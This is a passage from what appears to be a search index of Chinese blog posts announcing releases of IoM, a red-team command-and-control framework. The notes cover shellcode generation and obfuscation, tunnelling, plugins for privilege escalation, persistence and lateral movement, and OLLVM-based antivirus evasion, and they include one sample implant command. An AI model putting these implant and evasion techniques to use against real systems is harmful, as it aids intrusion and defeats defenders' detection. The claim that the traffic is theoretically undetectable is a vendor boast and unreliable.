<p>\u6211\u4eec\u6dfb\u52a0\u5927\u91cfshellcode\u751f\u6210\uff0csRDI\u7b49\u64cd\u4f5c\u76f8\u5173\u7684api\u3002</p> <ul> <li>artifact_payload ,\u5bf9\u5e94CobaltStrike\u4e2d\u7684\u540c\u540d\u51fd\u6570\uff0c \u7528\u4e8e\u751f\u6210stageless\u7684shellcode\uff0c \u5728IoM\u662fSRDI\u540e\u7684beacon</li> <li>artifact_stager\uff0c \u5bf9\u5e94CobaltStrike\u4e2d\u7684\u540c\u540d\u51fd\u6570\uff0c \u7528\u4e8e\u751f\u6210stager\u7684shellcode\uff0c \u5728IoM\u4e2d\u5f0fSRDI\u540e\u7684pulse</li> <li>donut_dll2shellcode, \u57fa\u4e8edonut\u5b9e\u73b0\u7684dll\u8f6cshellcode </li> <li>donut_exe2shellcode, \u57fa\u4e8edonut\u5b9e\u73b0\u7684exe\u8f6cshellcode</li> <li>sgn_encode, shellcode sgn\u6df7\u6dc6</li> <li>srdi, \u80fd\u8c03\u7528malefic-mutant\u4e2d\u652f\u6301\u7684srdi\u5c06\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8f6c\u4e3ashellcode</li> <li>.....</li> </ul> <p>\u8be6\u7ec6\u6587\u6863\u53ef\u4ee5\u67e5\u9605: https://chainreactors.github.io/wiki/IoM/manual/mal/builtin/#artifact </p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#donut","title":"donut","text":"<p>\u5c06\u5185\u7f6e\u7684donut\u4ece https://github.com/Binject/go-donut \u8fc1\u79fb\u5230 https://github.com/wabzsy/gonut .</p> <p>\u5e76\u5bf9\u5176\u8fdb\u884c\u4e86\u5927\u91cf\u6539\u52a8:</p> <ol> <li>\u5c06\u5185\u7f6e\u7684donut \u4ecev1.0 \u66f4\u65b0\u5230v1.1 , \u73b0\u5728\u66f4\u52a0\u7a33\u5b9a</li> <li>\u5c06execute-assembly\u66ff\u6362\u4e3adonut\u751f\u6210\u7684shellcode (\u4e34\u65f6\uff0c \u540e\u7eed\u4f1a\u4f7f\u7528malefic-srdi\u4ee3\u66ff)</li> <li>\u65b0\u589edonut\u547d\u4ee4</li> </ol> <p></p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#\u975e\u4ea4\u4e92\u5f0fclient","title":"\u975e\u4ea4\u4e92\u5f0fclient","text":"<p>\u7279\u5b9a\u573a\u666f\u4e0b\u4f7f\u7528, \u66f4\u8f7b\u91cf\u7684\u4ea4\u4e92\u6a21\u5f0f</p> <pre><code>.\\client.exe implant whoami --use 08d6c05a21512a79a1dfeb9d2a8f262f --auth admin_127.0.0.1.auth --wait\n</code></pre> <p></p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#other-of-others","title":"Other of others","text":"<ul> <li>lua api\u6587\u6863\u683c\u5f0f\u91cd\u6784\uff0c \u73b0\u5728\u66f4\u52a0\u6e05\u6670</li> <li>\u5c06sgn\u4e0emalefic-mutant\u5728\u7f16\u8bd1\u65f6\u5185\u5d4c\uff0c \u51cf\u5c11\u5b89\u88c5\u65f6\u7684\u6b65\u9aa4 </li> <li>\u4f18\u5316<code>!</code>\u547d\u4ee4\uff0c \u80fd\u66f4\u597d\u5f97\u6267\u884c\u672c\u5730\u7684\u547d\u4ee4\uff0c \u800c\u4e0d\u9700\u8981\u9000\u51fa\u7a0b\u5e8f</li> <li>\u7f16\u8bd1pulse\u65f6 \u8054\u52a8beacon</li> <li>\u91cd\u6784website</li> <li>\u4f18\u5316tui\u6e32\u67d3\u7684\u989c\u8272</li> <li>\u4fee\u590d\u4e86\u5404\u79cd\u7ec6\u8282\u5904\u7684bug\u6570\u5341\u5904</li> </ul>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#end","title":"End","text":"<p>\u5728\u6211\u4eec\u6700\u521d\u7684\u8ba1\u5212\u4e2d\uff0c \u6211\u4eec\u7684ASM\u6846\u67b6mapping\u53ef\u4ee5\u4e0eC2\u6846\u67b6IoM\u540c\u6b65\u8fdb\u884c\u3002 \u4f46\u662fC2\u9700\u8981\u8017\u8d39\u7684\u7cbe\u529b\u8fdc\u8d85\u60f3\u8c61\uff0c \u6240\u4ee5ASM\u518d\u6b21\u88ab\u6401\u7f6e\u3002 \u597d\u5728\u4ee3\u7406\u5de5\u5177rem\u7684\u8fdb\u5c55\u987a\u5229\uff0c\u4e0d\u51fa\u610f\u5916\u8fd1\u671f\u5c31\u53ef\u4ee5\u89c1\u9762\u3002 </p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#rem","title":"rem","text":"<p>rem\u7684\u7b80\u4ecb\uff1a</p> <p>\u5728 rem \u4e2d, \u57fa\u4e8e\u4f20\u8f93\u5c42\u4e4b\u4e0a\u91cd\u65b0\u62bd\u8c61\u4e86\u6574\u4e2a\u7f51\u7edc\u4ea4\u4e92\u7684\u6d41\u7a0b\u3002</p> <ul> <li>\u4f20\u8f93\u5c42, \u5bf9\u5e94 tunnel, \u5206\u4e3a listener \u548c dialer, \u53ef\u4ee5\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u4efb\u610f\u4f20\u8f93\u5c42\u4fe1\u9053\uff0c \u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684 golang \u7684\u63a5\u53e3\u5373\u53ef\u3002\u76ee\u524d\u5b9e\u73b0\u4e86\uff0ctcp, udp, icmp, websocket.</li> <li>\u4f1a\u8bdd\u5c42, \u5b9e\u73b0\u4e86\u94fe\u63a5\u590d\u7528(mux)\uff0c\u4f1a\u8bdd\u7ba1\u7406.</li> <li>\u52a0\u5bc6\u6df7\u6dc6\u5c42(\u5bf9\u5e94\u8868\u793a\u5c42)\uff0c\u5bf9\u5e94 core/wrapper\uff0c\u5bf9\u5e94\u7684\u63a5\u53e3\u662f ReadWriteCloser, \u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684 Read \u548c Writer \u63a5\u53e3\uff0c \u5373\u53ef\u5b9e\u73b0\u5bf9\u4f20\u8f93\u5c42\u6d41\u7a0b\u7684\u52a0\u5bc6\uff0c\u6df7\u6dc6\uff0c \u4f2a\u88c5\u3002\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u4e0a\u4e0b\u884c\u6d41\u91cf\u5206\u522b\u914d\u7f6e\u4e0d\u540c\u7684 wrapper. \u76ee\u524d\u5b9e\u73b0\u4e86 aes, xor, padding.</li> <li>\u4e2d\u8f6c/\u4ee3\u7406\u5c42(\u5bf9\u5e94\u8868\u793a\u5c42) (\u53ef\u9009), \u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e09\u65b9\u4ee3\u7406/\u670d\u52a1\u4e2d\u8f6c\u6d41\u91cf\uff0c \u4f8b\u5982\u901a\u8fc7 ssh, socks5, neoreg, suo5 \u7b49\u4efb\u610f\u5177\u6709\u6d41\u91cf\u529f\u80fd\u7684\u5b9e\u73b0\u6570\u636e\u8f6c\u53d1, \u76ee\u524d\u5b9e\u73b0\u4e86 http/https, socks5/4, ssh, shadowsocks</li> <li>\u5e94\u7528\u5c42, \u57fa\u4e8e\u4e0a\u9762\u4e09\u5c42\u5b9e\u73b0\u7684\u4fe1\u9053, \u53ef\u4ee5\u88ab\u5c01\u88c5\u4e3a\u4e0d\u540c\u7684\u5e94\u7528, \u76ee\u524d\u5b9e\u73b0\u4e86 socks5, port forward, http \u4ee3\u7406, shadowsocks, trojan</li> </ul> <p>\u57fa\u4e8e\u8fd9\u6837\u7684\u62bd\u8c61\u5c42\u7ea7, \u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u62d3\u5c55 rem \u7684\u80fd\u529b\u8fb9\u754c\u3002 \u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u6dfb\u52a0\u4e00\u4e2a\u4f20\u8f93\u5c42\u534f\u8bae\uff0c \u6216\u662f\u52a0\u5bc6\u6df7\u6dc6\u7b97\u6cd5\uff0c \u6216\u662f\u4ee3\u7406\u4e2d\u8f6c\u5de5\u5177\uff0c \u53c8\u6216\u662f\u6700\u7ec8\u9762\u5411\u7528\u6237\u7684\u534f\u8bae\u3002</p> <p>\u8fd9\u662f\u524d\u6240\u672a\u6709\u7684\u6f5c\u529b\uff0c \u7406\u8bba\u4e0a\u4e0d\u5b58\u5728\u4efb\u4f55\u5728\u6d41\u91cf\u4e0a\u88ab\u7279\u5f81/\u7edf\u8ba1\u5b66\u68c0\u6d4b\u7684\u53ef\u80fd\u3002</p> <p>\u53ef\u4ee5\u5728 https://chainreactors.github.io/wiki/rem/design/ \u627e\u5230rem\u7684\u8bbe\u8ba1\u6587\u6863(update 2024.12), \u66f4\u65b0\u4e86\u91cd\u6784\u540e\u7684rem\u67b6\u6784\u8bbe\u8ba1\u3002</p>"},{"location":"blog/2025/01/02/IoM_v0.0.4/#iom-gui","title":"IoM-gui","text":"<p>\u5e76\u4e14IoM\u7684GUI\u4e5f\u5df2\u7ecf\u5b8c\u6210\u4e86\u5927\u90e8\u5206\u5de5\u4f5c\uff0c \u9a6c\u4e0a\u53ef\u4ee5\u53d1\u5e03v0.0.1\u7684IoM-gui .</p> <p>\u6211\u4eec\u7ec8\u4e8e\u53ef\u4ee5\u901a\u8fc7\u53ef\u89c6\u5316\u7684\u65b9\u5f0f\u5448\u73b0\u5404\u79cd\u590d\u6742\u7684\u529f\u80fd\u3002</p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/","title":"IoM v0.1.0 \u4ee3\u66ffCobaltStrike\u7684\u6700\u540e\u56db\u5757\u788e\u7247","text":"<p>\u7ecf\u8fc7\u51e0\u4e2a\u6708\u7684\u65f6\u95f4\uff0c\u5e26\u6765\u4e86\u56db\u5927\u5168\u65b0\u7ec4\u4ef6, \u4ee5\u53ca\u5341\u51e0\u4e2a\u8f83\u5927\u7684\u529f\u80fd\u6027\u66f4\u65b0\u4e0e\u6570\u767e\u4e2a\u4fee\u590d\u4e0e\u4f18\u5316\u3002</p> <p>\u4e0e\u4e4b\u524d\u4e00\u6837\uff0c\u5728\u66f4\u65b0\u516c\u544a\u4e2d\u7684\u5927\u90e8\u5206\u5185\u5bb9\u90fd\u5c06\u4f1a\u5728community\u7248\u672c\u4e2d\u63d0\u4f9b</p> <p>\u56db\u5927\u65b0\u7ec4\u4ef6: </p> <ul> <li>\u57fa\u4e8evscode extension\u7684GUI\u5ba2\u6237\u7aef</li> <li>\u57fa\u4e8elua\u811a\u672c\u8bed\u8a00\u7684\u63d2\u4ef6\u7cfb\u7edf\u4ee5\u53ca\u8fc1\u79fb\u4e86\u6570\u767e\u4e2a\u63d2\u4ef6\u7684\u57fa\u7840\u63d2\u4ef6\u751f\u6001</li> <li>\u57fa\u4e8erem\u5b9e\u73b0\u7684\u4ee3\u7406/\u96a7\u9053\u529f\u80fd\u7ec4</li> <li>\u7c7b\u4f3cBeaconGate\u7684\u52a8\u6001\u51fd\u6570\u8c03\u7528\u548cOllvm</li> </ul> <p>\u5f53\u7136\u76ee\u524d\u4e0eCobaltStrike\u5bf9\u6bd4\u4e0d\u514d\u6709\u4e9b\u4e0d\u81ea\u91cf\u529b(\u56e0\u7f3a\u5c11\u5927\u91cf\u5b9e\u6218\u6d4b\u8bd5\u4fee\u590d\u5404\u79cdbug)\u3002\u4f46\u8fd9\u4e5f\u4ee3\u8868IoM\u4e3b\u4f53\u529f\u80fd\u7684\u9636\u6bb5\u6027\u6210\u679c\u3002IoM\u4e0d\u518d\u662f\u4e00\u4e2a\u5b9e\u9a8c\u5ba4\u4e2d\u7684demo\uff0c \u800c\u662f\u80fd\u521d\u6b65\u7528\u4e8e\u5b9e\u6218\u7684\u5de5\u5177\u3002 </p> <p>CobaltStrike\u6700\u5927\u7684\u62a4\u57ce\u6cb3\u662f\u4e1d\u6ed1\u7684GUI\u5ba2\u6237\u7aef\uff0c \u7a33\u5b9a\u7684beacon\uff0c\u4ee5\u53ca\u4e30\u5bcc\u7684\u63d2\u4ef6\u751f\u6001\u3002\u4ee5\u81f3\u4e8e\u62b9\u5e73\u5176OPSEC\u4e0a\u7684\u52a3\u52bf\u3002 \u800c\u73b0\u5728CobaltStrike\u7684\u4e8c\u5f00\u6b62\u6b654.6\uff0c \u7834\u89e3\u7248\u672c\u505c\u6ede\u57284.10\uff0c \u4e3b\u6d41\u7684CobaltStrike\u7684\u4f7f\u7528\u8005\u9010\u6e10\u8fdc\u79bb\u4e86\u5176\u6700\u65b0\u7248\u672c\u3002 \u8fd9\u8ba9IoM\u6709\u673a\u4f1a\u6210\u4e3aCS\u7684\u5907\u9009\u54c1(\u6211\u4eec\u627f\u8ba4\u8ddd\u79bb\u4ee3\u66ffCS\u8fd8\u6709\u4e0d\u5c0f\u7684\u8ddd\u79bb)\u3002</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#\u65b0\u7ec4\u4ef6","title":"\u65b0\u7ec4\u4ef6","text":""},{"location":"blog/2025/04/14/IoM_v0.1.0/#gui-\u5ba2\u6237\u7aef","title":"GUI \u5ba2\u6237\u7aef","text":"<p>GUI \u4f7f\u7528\u8bf4\u660e\u89c1 https://chainreactors.github.io/wiki/IoM/manual/manual/GUI/</p> <p>showcase</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#mals-\u63d2\u4ef6\u751f\u6001","title":"Mals \u63d2\u4ef6\u751f\u6001","text":"<p>https://github.com/chainreactors/mal-community</p> <p>\u5728v0.0.3\u4e2d\uff0c \u6211\u4eec\u7b2c\u4e00\u6b21\u63d0\u4f9b\u4e86mal-community\u3002 \u73b0\u5728\u56de\u770b\uff0c \u5f53\u65f6\u7684\u5b9e\u73b0\u8f83\u4e3a\u7c97\u7cd9\uff0c \u6709\u975e\u5e38\u591a\u7684bug\u4e0e\u8bbe\u8ba1\u7f3a\u9677\uff0c \u7ecf\u8fc7\u4e24\u4e2a\u7248\u672c\u7684\u6253\u78e8\u3002 \u6211\u4eec\u53ef\u4ee5\u53d1\u5e03mals 1.0\u7248\u672c\u4e86\u3002  </p> <p>\u5feb\u901f\u5165\u95e8mals :  https://chainreactors.github.io/wiki/IoM/manual/mal/quickstart/ </p> <p>\u5df2\u7ecf\u5b9e\u73b0/\u8fc1\u79fb\u7684\u63d2\u4ef6\u5305: </p> <ul> <li>lib<ul> <li>noconsolation, https://github.com/fortra/No-Consolation</li> <li>SharpBlock, https://github.com/CCob/SharpBlock</li> </ul> </li> <li>common (\u57fa\u7840\u5de5\u5177)<ul> <li>operatorskit, https://github.com/REDMED-X/OperatorsKit</li> <li>remoteopsbof, https://github.com/trustedsec/CS-Remote-OPs-BOF</li> <li>situationalbof, https://github.com/trustedsec/CS-Situational-Awareness-BOF</li> <li>chainreactor, gogo/zombie/spray \u7b49 chainreactor \u7684\u5de5\u5177</li> <li>\u5927\u91cf\u5176\u4ed6\u72ec\u7acb\u5de5\u5177</li> </ul> </li> <li>elevate (\u63d0\u6743)<ul> <li>https://github.com/icyguider/UAC-BOF-Bonanza</li> <li>postexpkit\u4e2d\u7684\u90e8\u5206</li> <li>https://github.com/rsmudge/ElevateKit</li> </ul> </li> <li>persistence (\u6743\u9650\u7ef4\u6301)<ul> <li>https://github.com/0xthirteen/StayKit</li> </ul> </li> <li>proxy (\u7f51\u7edc/\u4ee3\u7406)<ul> <li>https://github.com/go-gost/gost</li> <li>https://github.com/chainreactors/rem-community</li> </ul> </li> <li>domain (\u57df\u6e17\u900f)<ul> <li>https://github.com/wavvs/nanorobeus</li> <li>\u5e38\u7528\u57df\u6e17\u900f\u5de5\u5177</li> </ul> </li> <li>move (\u6a2a\u5411\u79fb\u52a8)<ul> <li>https://github.com/0xthirteen/MoveKit</li> </ul> </li> </ul> <p>\u6211\u4eec\u8fc1\u79fb\u4e86\u6570\u767e\u4e2aCobaltStrike\u7684\u63d2\u4ef6\u529f\u80fd\uff0c \u5b8c\u6210\u4e86mals\u793e\u533a\u7684\u8d77\u6b65\u9636\u6bb5\u7684\u57fa\u7840\u8bbe\u65bd\u5efa\u8bbe\uff0c \u8fd9\u4e9b\u529f\u80fd\u8986\u76d6\u7edd\u5927\u591a\u6570\u5e38\u7528\u7684CobaltStrike\u7684\u4f7f\u7528\u573a\u666f\u3002</p> <p>\u4e5f\u662f\u5bf9IoM\u57fa\u7840\u80fd\u529b\u7684\u4e00\u6b21\u5b8c\u6574\u7684\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u63d2\u4ef6\u5927\u90e8\u5206\u7ecf\u8fc7\u6211\u4eec\u7684\u7b80\u5355\u6d4b\u8bd5\uff0c \u786e\u4fdd\u5176\u81f3\u5c11\u80fd\u8fd0\u884c\u5728implant\u4e2d\u4e0dpanic\u4ee5\u53ca\u57fa\u672c\u529f\u80fd\u6b63\u5e38\u3002</p> <p>\u8fd9\u610f\u5473\u7740mals\u4e0emalefic\u529f\u80fd\u4e0a\u80fd\u5b8c\u5168\u4ee3\u66ffCobaltStrike\u7684aggresive script\uff0c \u5e76\u4e14\u63d0\u4f9b\u4e86\u7ec6\u7c92\u5ea6\u66f4\u9ad8\u7684API\u3002</p> <p>\u6211\u4eec\u671f\u5f85mals\u80fd\u5728C2\u793e\u533a\u4e2d\u6709\u4e00\u5e2d\u4e4b\u5730</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#mals\u4e2d\u95f4\u5c42","title":"mals\u4e2d\u95f4\u5c42","text":"<p>\u901a\u8fc7 https://github.com/chainreactors/mals \u5b9e\u73b0\u4e86\u4e00\u4e2agrpc\u4e0egolang\u7684\u4e2d\u95f4\u5c42\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e2d\u95f4\u5c42\u5c06\u5404\u79cd\u5185\u90e8\u51fd\u6570/grpc\u7b49\u5bf9\u5916\u66b4\u9732\u7ed9lua\uff0c yaegi\u7b49\u811a\u672c\u8bed\u8a00\u3002 \u76ee\u524d\u4ee5lua\u4e3a\u4e3b\uff0c \u5b9e\u73b0\u4e86\u4e00\u5957\u9ad8\u7ec6\u7c92\u5ea6\u7684api\uff0c\u4ee5\u53ca\u81ea\u52a8\u6587\u6863\u751f\u6210\u3002</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#rem","title":"REM","text":"<p>https://github.com/chainreactors/rem-community</p> <p>rem\u662f\u5168\u573a\u666f\u4ee3\u7406/\u96a7\u9053\u5de5\u5177. \u63d0\u4f9b\u4e86\u5168\u8bbf\u95ee\u7684\u7f51\u7edc\u4fa7\u529f\u80fd\u3002 \u4f8b\u5982\u6b63\u53cd\u5411\u4ee3\u7406\uff0c\u7aef\u53e3\u8f6c\u53d1\uff0c\u591a\u4f20\u8f93\u5c42\u4fe1\u9053\uff0c \u7ea7\u8054\u7b49\u7b49\u529f\u80fd\u3002</p> <p>v0.1.0 \u5168\u9762\u63a5\u5165\u4e86rem \u5b83\u4f1a\u5728listener\uff0cclient\uff0c implant\u53d1\u6325\u4e0d\u540c\u7684\u4f5c\u7528\u3002 \u6211\u5c06\u5206\u522b\u4ecb\u7ecd</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#rem-for-pipeline","title":"rem for pipeline","text":"<p>\u65b0\u589erem\u914d\u7f6e\u9879\uff0c \u76d1\u542crem console \u670d\u52a1</p> <p></p> <p>\u8fd9\u4e2a\u670d\u52a1\u53ef\u4ee5\u7ed9\u666e\u901a\u7684rem\u4e8c\u8fdb\u5236\u6587\u4ef6\u76f4\u63a5\u4f7f\u7528\uff0c \u4e5f\u53ef\u4ee5\u8ba9client\u4e0eimplant\u8fde\u63a5\u3002</p> <p>\u4e0d\u518d\u9700\u8981\u4e0b\u8f7d\u72ec\u7acb\u7684rem\u7a0b\u5e8f\uff0c IoM\u7684server\u5c31\u53ef\u4ee5\u5f53\u4f5crem\u7684\u670d\u52a1\u7aef\uff0c \u5e76\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u7ba1\u7406\u529f\u80fd\u3002</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#rem-for-implant","title":"rem for implant","text":"<p>\u63d0\u4f9b\u4e863\u79cd\u52a0\u8f7drem\u7684\u65b9\u5f0f\u3002 </p> <ol> <li>\u901a\u8fc7.a \u6587\u4ef6\u9759\u6001\u7f16\u8bd1(\u4e0d\u652f\u6301windows msvc)</li> <li>\u901a\u8fc7 dll/so \u53cd\u5c04\u52a8\u6001\u52a0\u8f7d</li> <li>\u901a\u8fc7 pe loader \u52a0\u8f7dexe/elf\u3002(pe to shellcode\u4e5f\u7b97\u4f5c\u6b64\u5217)</li> </ol> <p>\u8fd9\u4e09\u79cd\u65b9\u5f0f\u8986\u76d6\u4e86\u7edd\u5927\u591a\u6570\u4f7f\u7528\u573a\u666f\uff0c rem\u867d\u7136\u662fgolang\u7f16\u5199\u7684\uff0c \u4f46\u662f\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u9759\u6001\u8fde\u63a5/\u53cd\u5c04\u52a8\u6001\u52a0\u8f7d\u5230implant\u4e2d\u3002 \u53ef\u4ee5\u4f5c\u4e3a\u72ec\u7acb\u7684\u5de5\u5177\uff0c \u548c\u5176\u4ed6\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u4e00\u6837\u88abpe loader\u52a0\u8f7d\u3002 \u5728OPSEC\u4e0a\u6709\u7565\u5fae\u7684\u4e0d\u540c\uff0c \u53ef\u4ee5\u53c2\u7167\u5bf9\u5e94\u7684\u547d\u4ee4\u7684helper\u7406\u89e3\u5176\u5b9e\u73b0\u539f\u7406\u3002 </p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#\u5e38\u7528\u7684tunnelproxy\u529f\u80fd","title":"\u5e38\u7528\u7684tunnel/proxy\u529f\u80fd","text":"<p>\u5e38\u89c1\u7684\u6b63\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1, \u6b63\u53cd\u5411\u4ee3\u7406\u90fd\u53ef\u4ee5\uff0c\u4ee5\u53ca\u7c7b\u4f3cCS\u7684rportfwd_local\u4ee5\u53caCS\u90fd\u6ca1\u6709\u7684portfwd_local\u90fd\u53ef\u4ee5\u57fa\u4e8erem\u5b9e\u73b0\u3002\u5b8c\u6210\u5e38\u89c1proxy/tunnel \u7684\u5168\u8986\u76d6</p> <p></p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-rem-transport","title":"implant rem transport","text":"<p>\u9664\u4e86\u8fd0\u884crem\u6a21\u5757\u642d\u5efa\u96a7\u9053\uff0c\u8fd8\u652f\u6301\u91cd\u8f7dimplant\u7684\u4fe1\u9053\uff0c\u5b9e\u73b0 rem over implant\u3002 \u8ba9rem\u5728\u7f51\u7edc\u4fa7\u5bf9\u6297\u53d1\u5149\u53d1\u70ed\uff0c rust\u5728\u7f51\u7edc\u76f8\u5173\u7684\u73a9\u6cd5\u4e0a\u7565\u900a\u4e8egolang\u3002 </p> <p>\u901a\u8fc7rem\u9759\u6001\u94fe\u63a5\u5e93\u7684FFI\u63a5\u53e3\u5728implant\u7f16\u8bd1\u65f6\u94fe\u63a5\uff0c \u5b9e\u73b0\u91cd\u8f7d\u4f20\u8f93\u5c42\uff0c\u590d\u7528rem\u80fd\u591f\u5b9e\u73b0\u7684\u4e00\u5207\u6d41\u91cf\u5c42\u7279\u6027\u3002</p> <p>\u8fd9\u4e5f\u662fIoM\u5728\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u90fd\u6ca1\u6709\u63d0\u4f9b\u9664\u4e86tls\u4e4b\u5916\u7684\u4efb\u4f55\u4f20\u8f93\u5c42\u7684\u539f\u56e0\uff0c\u6240\u6709\u7f51\u7edc\u4fa7\u7684\u5bf9\u6297\u90fd\u53ef\u4ee5\u4ea4\u7ed9rem\u5b9e\u73b0</p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#rem-for-clientmals","title":"rem for client/mals","text":"<p>rem\u672c\u8eab\u53ea\u9700\u8981\u901a\u8fc7\u5355\u884c\u547d\u4ee4\u5b9e\u73b0\u6240\u6709\u529f\u80fd\uff0c \u800cIoM\u7684client\u4e0a\u7684rem\u76f8\u5173\u547d\u4ee4\u7ec4\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63d0\u4f9b\u4e86rem\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u7ba1\u7406\u5de5\u5177\u3002 \u53ef\u4ee5\u5728client\u4e0a\u7ba1\u7406\u5df2\u6709\u7684\u8fde\u63a5\uff0c\u65b0\u5efa\u96a7\u9053\uff0c \u4fee\u6539\u914d\u7f6e\u7b49\u3002 </p> <p>\u6700\u5e38\u89c1\u7684\u7528\u6cd5\u5df2\u7ecf\u5c01\u88c5\u5728\u547d\u4ee4\u884c\u4e2d\uff0c \u4f46\u662f\u8fd8\u6709\u4e00\u4e9brem\u7279\u6709\u7684\u9ad8\u7ea7\u7528\u6cd5\uff0c\u901a\u8fc7mal-community\u4e2d\u7684community-proxy\u52a8\u6001\u6ce8\u518c\u3002  </p> <p>\u800cclient\u672c\u8eab\u4e5f\u652f\u6301\u63a5\u5165 listener \u2194 implant \u6784\u5efa\u7684\u7f51\u7edc\uff0c \u5b9e\u73b0\u7f51\u7edc\u6d4b\u7684\u4e09\u7aef\u6253\u901a\u3002 </p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#\u5c0f\u7ed3","title":"\u5c0f\u7ed3","text":"<p>\u603b\u7684\u6765\u8bf4\uff0c \u6211\u4eec\u53ef\u4ee5\u5728client\u4e2d\u901a\u8fc7\u4e00\u7ec4\u547d\u4ee4\u64cd\u63a7server\u7ba1\u7406rem\u7684console\uff0c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u57fa\u4e8erem\u5728implant\u5b9e\u73b0\u5404\u79cd proxy/tunnel\u7684\u529f\u80fd\u3002 </p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-opsec","title":"implant OPSEC","text":"<p>\u5173\u4e8eOPSEC\u7684\u90e8\u5206\u6211\u4eec\u4f1a\u4fdd\u6301\u95ed\u6e90\uff0c \u901a\u8fc7\u63d0\u4f9b\u9759\u6001\u94fe\u63a5\u5e93\u516c\u5f00\u57fa\u7840\u53ef\u7528\u7248\u672c\u3002</p> <p>CobaltStrike\u6709\u4e09\u4e2a\u5927\u7684OPSEC\u5b9a\u5236\u5207\u9762\uff0c \u5206\u522b\u662fUDRL\uff0csleepmask \u4ee5\u53ca\u6700\u65b0\u7684BeaconGate\u3002\u6211\u4eec\u6b63\u5728\u9010\u6b65\u5b9e\u73b0CS\u7684\u8fd9\u4e9bOPSEC\u529f\u80fd\uff0c \u4ee5\u53ca\u66f4\u591a\u7684CS\u6ca1\u6709\u7684OPSEC\u9009\u9879\u3002 </p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#beacon-gate","title":"Beacon Gate","text":"<p>\u5728\u8bbe\u8ba1\u521d\u671f\uff0c <code>IoM</code> \u5bf9\u5404\u7c7b <code>API</code> \u7684\u8c03\u7528\u90fd\u662f\u4e3a\u4e00\u5207\u53ef\u914d\u7f6e\u53ef\u8c03\u63a7\u800c\u8bbe\u8ba1\u7684\uff0c \u867d\u7136\u5e76\u672a\u4ee5\u5f00\u6e90\u5f62\u5f0f\u516c\u5f00\uff0c \u4f46\u6211\u4eec\u53d1\u73b0\u5176\u4e0e <code>Beacon Gate</code> \u7684\u8bbe\u8ba1\u4e0d\u8c0b\u800c\u5408\uff0c \u8fd9\u4e5f\u610f\u5473\u7740\u6211\u4eec\u5728\u5185\u90e8\u53ef\u4ee5\u505a\u5230\u540c\u6837\u7684\u64cd\u4f5c\uff0c \u7528\u5185\u7f6e\u5404\u7c7b\u52a8\u6001\u53ef\u8c03\u63a7 <code>API</code> \u4e3a <code>BOF</code> \u548c <code>Beacon</code> \u8fdb\u884c\u6b66\u88c5</p> <p>\u5728v0.1.0\u7248\u672c\u4e2d\uff0c BeaconGate\u5f97\u5230\u4e86\u5168\u9762\u5347\u7ea7\u6216\u8bb8\u6211\u4eec\u5f97\u7ed9\u8fd9\u4e2a\u529f\u80fd\u8d77\u4e00\u4e2a\u65b0\u7684\u540d\u5b57\u3002 </p> <p>\u8be5\u529f\u80fd\u6682\u65f6\u4ec5\u63d0\u4f9b\u7ed9Professional\u7248\u672c\u3002  \u540e\u7eed\u5c06\u4f1a\u4ece\u4e2d\u5207\u5272\u4e00\u4e2a\u4e0eCobaltStrike\u7684beacongate\u7c7b\u4f3c\u7684\u529f\u80fd\u63d0\u4f9b\u7ed9community\u3002 </p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#ollvm","title":"Ollvm","text":"<p>ollvm\u662frust\u9759\u6001\u514d\u6740\u7684\u901a\u7528\u89e3\u51b3\u65b9\u6848\u4e4b\u4e00\u3002 \u9762\u5bf9\u76ee\u524d\u67d0\u4e9b\u6740\u8f6f\u57fa\u4e8e\u7279\u5f81\u7684\u9759\u6001\u6587\u4ef6\u8bc6\u522b\u65b9\u6848\uff0c \u5982\u4f55\u5feb\u901f\u6539\u53d8\u5185\u90e8\u7ed3\u6784\u662f\u4e00\u4e2a\u975e\u5e38\u6709\u8da3\u7684\u8bdd\u9898\uff0c <code>ollvm</code> \u4fbf\u662f\u4e00\u79cd\u975e\u5e38\u6709\u6548\u800c\u6709\u529b\u7684\u624b\u6bb5\uff0c \u901a\u8fc7\u6dfb\u52a0 <code>pass</code>\uff0c \u5728\u589e\u52a0\u9006\u5411\u6210\u672c\u7684\u540c\u65f6\uff0c \u6211\u4eec\u4e5f\u53ef\u4ee5\u5feb\u901f\u589e\u52a0\u7a0b\u5e8f\u7684\u4fe1\u606f\u71b5\uff0c \u4ee5\u8fdb\u884c\u9759\u6001\u7279\u5f81\u4e0a\u7684\u89c4\u907f\u3002</p> <p>v0.1.0 